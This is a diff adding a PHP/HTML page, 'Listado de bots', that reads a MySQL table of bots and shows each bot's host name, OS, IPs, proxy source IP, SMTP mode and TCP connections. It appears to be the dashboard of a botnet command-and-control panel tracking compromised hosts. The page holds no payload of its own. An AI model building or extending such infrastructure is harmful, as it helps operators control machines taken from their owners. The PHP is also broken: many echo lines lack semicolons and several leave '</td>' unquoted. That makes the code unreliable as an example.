@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="">
+
+	<!-- ------ 5 minutos 300 segundos --- -->	
+	<meta http-equiv="refresh" content="300">
+	<!-- --------------------------------- -->
+	
+	<title>Listado de bots</title>
+	
+	<!-- Bootstrap Core CSS -->
+	<link href="css/bootstrap.min.css" rel="stylesheet">
+	
+	<!-- Custom CSS -->
+	<link href="css/stylish-portfolio.css" rel="stylesheet">
+	
+	<!-- Custom Fonts -->
+	<link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	
+	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+	<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+	<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+	<![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Header -->
+    <header id="top" class="header">    
+		
+    </header>
+
+
+	<!-- content -------------------------------------- -->
+    <section>
+  
+	<!-- -------------------------------------------------------------------------------------------- -->
+
+		<div class="table-responsive">
+		  	<table class="table table-striped">
+				<thead>
+					<th colspan="6" style="background-color:#F0AD4E;" class="text-center">Bot conectados </th>  
+				</thead>
+				<tbody class="text-center">|
+				  <tr>
+				    <td> botid </td>
+				    <td> status </td>
+				    <td> hostName </td>
+				    <td> osname </td>
+				    <td> osversion </td>
+				    <td> osarch </td>
+				    <td> hostuptime </td>
+				    <td> hostips </td>
+				    <td> sourceip </td>
+				    <td> proxysourceip </td>
+				    <td> smtpmode </td>
+				    <td> tcpconnections </td>
+				    <td> created </td>
+				    <td> lastupdated</td>
+				  </tr>
+				  
+<?php
+include_once("./conexiondb.php");
+
+$botid;
+$status;
+$hostName;
+$osname;
+$osversion;
+$osarch;
+$hostuptime;
+$hostips;
+$sourceip;
+$proxysourceip;
+$smtpmode;
+$tcpconnections;
+$created;
+$lastupdated;
+
+		$query="select * from bots order by lastupdated;";
+
+		$row_num=0;
+		if($result=$connectmysqli->prepare($query)){
+			$result->execute();
+			$result->bind_result($botid, $status, $hostName, $osname, $osversion, $osarch, $hostuptime, $hostips, $sourceip, $proxysourceip, $smtpmode, $tcpconnections, $created, $lastupdated);
+			$result->store_result();
+
+			for($row_num=0;$row_num < $result->num_rows; $row_num++){
+				$result->data_seek($row_num);
+				$result->fetch();
+				//--------------
+				echo "<br> ".$result->num_rows;
+//				printf ("%s %s\n", $botid, $status);
+
+//----------------------------------
+
+				  echo "<tr>";
+				  echo "<td>".$botid." </td>"
+				  echo "<td>".$status." </td>"
+				  echo "<td>".$hostName." </td>"
+				  echo "<td>".$osname." </td>"
+				  echo "<td>".$osversion." </td>"
+				  echo "<td>".$osarch." </td>"
+				  echo "<td>".$hostuptime." </td>"
+				  echo "<td>".$hostips." </td>"
+				  echo "<td>".$sourceip </td>
+				  echo "<td>".$proxysourceip </td>
+				  echo "<td>".$smtpmode </td>
+				  echo "<td>".$tcpconnections </td>
+				  echo "<td>".$created </td>
+				  echo "<td>".$lastupdated</td>
+				  echo "</tr>".
+
+//-------------------------------			
+			}//
+		}//fin if
+		$result->close(); //limpiar consulta								
+		$connectmysqli->close();// cerrar conexion
+?>
+				  
+				  
+				  
+				</tbody>
+			</table>
+		</div>
+
+
+	<!-- -------------------------------------- -->
+	       	    
+    </section>
+
+	<section>
+	</section>
+
+    <footer  id="contact">                         
+    </footer>
+
+
+
+</body>
+</html>
